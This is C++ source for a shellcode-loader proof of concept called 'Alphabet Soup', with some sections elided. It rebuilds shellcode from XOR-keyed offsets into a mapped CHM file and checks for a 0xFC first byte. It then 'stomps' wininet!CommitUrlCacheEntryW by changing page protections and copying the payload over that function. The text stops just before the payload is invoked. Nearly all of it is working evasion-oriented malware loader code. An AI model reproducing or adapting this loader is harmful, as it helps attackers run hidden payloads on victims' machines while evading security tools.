/*
* local-injection.cpp: Alphabet Soup Local Injection PoC
* This version assembles the payload in a local buffer before "stomping" the target DLL.
...
int main() {
    printf("[*] Alphabet Soup PoC Local Vector Loader\n");
    ...
    // 3. THE HARVEST: Assemble soup in a local vector first
    printf("[*] Harvesting shellcode into local vector...\n");
    std::vector<BYTE> shellcodeBowl(soupSize);
    
    for (size_t i = 0; i < soupSize; i++) {
        unsigned long long realOffset = alphabetSoup[i] ^ soupKey;
        shellcodeBowl[i] = *((BYTE*)pChmBase + (DWORD)realOffset);
    }

    // --- INTEGRITY CHECK ---
    // Validate the first byte before committing to executable memory
    if (shellcodeBowl[0] != 0xFC) {
        printf("[!] Integrity failure! First byte is 0x%02X (Expected 0xFC)\n", shellcodeBowl[0]);
        return 1;
    }
    printf("[+] Shellcode reassembled and verified in local memory.\n");

    // 4. Module Stomping: Prepare the executable target
    printf("[*] Locating target function for stomping...\n");
    HMODULE hBowlDll = LoadLibraryA("wininet.dll");
    LPVOID pStompTarget = (LPVOID)GetProcAddress(hBowlDll, "CommitUrlCacheEntryW");

    // 5. THE POUR: Move from vector to executable memory
    DWORD oldProtect;
    VirtualProtect(pStompTarget, soupSize, PAGE_READWRITE, &oldProtect);
    
    // Efficiently copy the whole bowl in one go
    memcpy(pStompTarget, shellcodeBowl.data(), soupSize);
    printf("[+] Stomped wininet!CommitUrlCacheEntryW with assembled shellcode.\n");

    // 6. Invoke
    VirtualProtect(pStompTarget, soupSize, PAGE_EXECUTE_READ, &oldProtect);
